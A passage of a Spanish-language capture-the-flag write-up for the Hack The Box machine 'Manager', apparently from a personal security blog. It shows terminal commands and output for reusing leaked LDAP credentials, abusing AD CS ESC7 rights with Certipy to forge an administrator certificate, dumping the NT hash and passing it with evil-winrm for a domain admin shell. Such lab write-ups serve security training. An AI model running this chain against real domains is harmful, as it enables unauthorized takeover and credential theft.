+  inflating: index.html
+  inflating: js/bootstrap.js
+  inflating: js/jquery-3.4.1.min.js
+  inflating: service.html
+➜  content
+</code></pre></div></div>
+<h2 id="shell-as-raven">Shell as raven</h2>
+<ul>
+<li>Si examinamos el archivo <strong>old-conf.xml</strong> encontramos credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat .old-conf.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;ldap-conf xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+   &lt;server&gt;
+      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
+      &lt;open-port enabled=&quot;true&quot;&gt;389&lt;/open-port&gt;
+      &lt;secure-port enabled=&quot;false&quot;&gt;0&lt;/secure-port&gt;
+      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;
+      &lt;server-type&gt;microsoft&lt;/server-type&gt;
+      &lt;access-user&gt;
+         &lt;user&gt;raven@manager.htb&lt;/user&gt;
+         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
+      &lt;/access-user&gt;
+      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
+   &lt;/server&gt;
+   &lt;search type=&quot;full&quot;&gt;
+      &lt;dir-list&gt;
+         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;
+      &lt;/dir-list&gt;
+   &lt;/search&gt;
+&lt;/ldap-conf&gt;
+</code></pre></div></div>
+<ul>
+<li>Vamos a corroborar si podemos conectarnos con <strong>evil-winrm</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Nos conectamos y podemos ver la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Raven\Documents&gt; type C:\Users\Raven\Desktop\user.txt
+192acfae62cbf1f9d9db96f43db90f99
+*Evil-WinRM* PS C:\Users\Raven\Documents&gt;
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>No podemos hacer gran cosa.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\Raven\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div></div>
+<ul>
+<li>Vamos a verificar los <strong>Advice Directory Certificate Services</strong> con la herramienta .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content certipy-ad find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
+[*] Got CA configuration for 'manager-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : manager-DC01-CA
+    DNS Name                            : dc01.manager.htb
+    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
+    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : MANAGER.HTB\Administrators
+      Access Rights
+        Enroll                          : MANAGER.HTB\Operator
+                                          MANAGER.HTB\Authenticated Users
+                                          MANAGER.HTB\Raven
+        ManageCa                        : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+                                          MANAGER.HTB\Raven
+        ManageCertificates              : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+    [!] Vulnerabilities
+      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
+Certificate Templates                   : [!] Could not find any certificate templates
+</code></pre></div></div>
+<h2 id="esc7">ESC7</h2>
+<ul>
+<li><p>Y bueno ya nos reporta que es vulnerable a <strong>ESC7</strong> esta vulnerabilidad se produce cuando un usuario tiene derechos de acceso elevados sobre el propio servicio de Certificate Authority (CA) o sobre la administración de certificados. En este caso específico, el usuario &quot;Raven&quot; tiene derechos de &quot;ManageCA&quot; (Administrar CA) .</p>
+</li>
+<li><p>Lo primero que vamos a hacer es sincronizarnos con el reloj del dominio.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content sudo ntpdate -u manager.htb
+2024-03-16 19:52:19.262396 (-0600) +25200.544784 +/- 0.076829 manager.htb 10.10.11.236 s1 no-leap
+CLOCK: time stepped by 25200.544784
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a usar <strong>certipy</strong> necesitamos usar el <strong>Manage CA permission</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+</code></pre></div></div>
+<ul>
+<li>Vamos a solicitar un certificado, falla, pero tenemos la clave.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 18
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 18.key
+[-] Failed to request certificate
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a emitir un certificado apartar de la solicitud previamente generada.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content certipy-ad ca -ca manager-DC01-CA -issue-request 18 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Successfully issued certificate
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a recuperar el certificado emitido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 18 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Rerieving certificate with ID 18
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '18.key'
+[*] Saved certificate and private key to 'administrator.pfx'
+</code></pre></div></div>
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+<ul>
+<li>Ahora con este certificado podemos obtener el hash <strong>NTLM</strong> del usuario administrador para esto es muy importante que tu reloj esté previamente sincronizado con la máquina.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@manager.htb
+[*] Trying to get TGT...
+[*] Got TGT 
+[*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+</code></pre></div></div>
+<ul>
+<li>Ahora nos conectamos ala máquina como administrador.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+manager\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</code></pre></div></div>
+<h2 id="root-txt">root.txt</h2>
+<ul>
+<li>Vemos la root flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
+b6a4acc041a47c288ef5c9a5f085678e
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
